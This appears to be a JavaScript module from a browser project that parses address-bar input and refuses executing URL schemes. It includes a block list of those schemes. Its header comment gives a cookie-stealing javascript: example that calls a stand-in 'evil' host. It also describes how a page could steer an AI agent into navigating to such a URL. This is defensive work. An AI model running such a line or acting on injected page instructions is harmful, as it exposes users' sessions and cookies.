// What the user typed → what to load (ADR-0037, issue #146).
//
// Pure, and separate from the window for two reasons. The obvious one is
// that address-bar parsing is a bug farm — "is this a URL or a search"
// has a long tail and every browser gets some of it wrong. The other is
// that one case here is a security boundary rather than a nicety, and a
// security boundary belongs somewhere it can be tested without a display.
//
// THE SECURITY CASE: `javascript:` and `data:` must never be navigable.
//
// Surfer exposes `navigate` as an Agent Bus tool, so a URL can arrive
// from the model — and a model can be steered by a page it just read.
// `javascript:fetch('https://evil/'+document.cookie)` in the address bar
// executes in the context of the CURRENT page, which is how a navigation
// becomes arbitrary script in a session the user is logged into. Firefox
// and Chrome both strip it from pasted input for exactly this reason.
//
// Refusing it here rather than in the tool means the same rule covers
// the address bar, the tool, and anything added later — one place, no
// second implementation to forget.

/// Schemes that execute or embed rather than fetch. Never navigable.
const REFUSED_SCHEMES = ['javascript:', 'data:', 'vbscript:', 'blob:'];

/// Schemes we hand to the engine as-is.
const PASSTHROUGH_SCHEMES = ['http:', 'https:', 'file:', 'about:'];

/// Bare hosts that are obviously hosts despite having no dot: a lone
/// `localhost` should not become a search.
const BARE_HOSTS = ['localhost'];

/// The result of reading the address bar.
///
/// `kind` is `"load"` (go here), `"search"` (this was a query), or
/// `"refused"` (a scheme that must not be navigated, with `reason`).
export function resolveInput(raw, {searchTemplate} = {}) {
    const text = (raw ?? '').trim();
    if (text === '')
        return {kind: 'search', url: null, query: ''};

    const lower = text.toLowerCase();

    // Refusal comes FIRST, before any normalising, so no amount of
    // whitespace or case tricks reaches the passthrough branch.
    // `JavaScript:` and ` javascript:` are the same attack.
    for (const scheme of REFUSED_SCHEMES) {
        if (lower.startsWith(scheme)) {
            return {
                kind: 'refused',
                url: null,
                reason: `${scheme} URLs are not navigable — they execute in the ` +
                        'context of the current page',
            };
        }
    }

    for (const scheme of PASSTHROUGH_SCHEMES) {
        if (lower.startsWith(scheme))
            return {kind: 'load', url: text};
    }

    // An unknown scheme (`mailto:`, `magnet:`, `ftp:`) is handed on: the
    // engine or the desktop decides. It is not our business to enumerate
    // the world's URI schemes, and the executing ones are already gone.
    //
    // But `host:port` looks exactly like `scheme:rest` — `localhost:3000`
    // and `example.com:8080` both match. Digits after the colon mean a
    // port, not a scheme; no registered scheme is all-numeric.
    const schemeMatch = /^([a-z][a-z0-9+.-]*):([^/?#]*)/i.exec(text);
    if (schemeMatch && !/^\d+$/.test(schemeMatch[2]))
        return {kind: 'load', url: text};

    // No scheme. Now the actual question: host or search?
    // A space anywhere means a search — no hostname contains one.
    if (/\s/.test(text))
        return {kind: 'search', url: searchUrl(text, searchTemplate), query: text};

    const host = text.split(/[/?#]/)[0];
    const bare = host.split(':')[0];
    const looksLikeHost =
        BARE_HOSTS.includes(bare.toLowerCase()) ||
        /^\d{1,3}(\.\d{1,3}){3}$/.test(bare) ||   // IPv4
        (bare.includes('.') && !bare.endsWith('.') && !bare.startsWith('.'));

    if (!looksLikeHost)
        return {kind: 'search', url: searchUrl(text, searchTemplate), query: text};

    // localhost and explicit ports stay http: telling somebody their dev
    // server is broken because we forced https would be our bug, not
    // theirs. Everything else gets https — no browser should default to
    // plaintext in 2026.
    const isLocal = BARE_HOSTS.includes(bare.toLowerCase()) ||
                    bare === '127.0.0.1' ||
                    bare.startsWith('192.168.') ||
                    bare.startsWith('10.');
    return {kind: 'load', url: `${isLocal ? 'http' : 'https'}://${text}`};
}

function searchUrl(query, template) {
    const t = template ?? 'https://duckduckgo.com/?q=%s';
    return t.replace('%s', encodeURIComponent(query));
}

/// What the address bar says when it has nothing else to say.
export const DEFAULT_PLACEHOLDER = 'Search or enter address';

/// What pressing Enter in the address bar should DO (#220).
///
/// resolveInput has three outcomes and the window handled two of them:
/// an empty bar is `{kind: "search", url: null}`, which reached
/// `load_uri(null)` and threw `Argument uri may not be null` inside a
/// signal handler, where nobody sees it. The third outcome lives here
/// so it is a case in a tested function rather than a branch somebody
/// remembers to write.
///
/// `placeholder` is always the text the entry should show afterwards —
/// a refusal's reason, or the default. It used to be set only on
/// refusal, which left the reason in the entry forever.
///
/// Note what this does NOT restrict: a person may navigate their own
/// browser to `file:///home/…`. The agent boundary is a different
/// question with a different answer (lib/actions.js, #214) — ADR-0029's
/// second test: a guardrail sits between the model and the machine,
/// never between a person and their own machine.
export function addressBarAction(raw, opts) {
    const r = resolveInput(raw, opts);
    if (r.kind === 'refused')
        return {act: 'refuse', url: null, placeholder: r.reason};
    if (r.url)
        return {act: 'load', url: r.url, placeholder: DEFAULT_PLACEHOLDER};
    return {act: 'nothing', url: null, placeholder: DEFAULT_PLACEHOLDER};
}
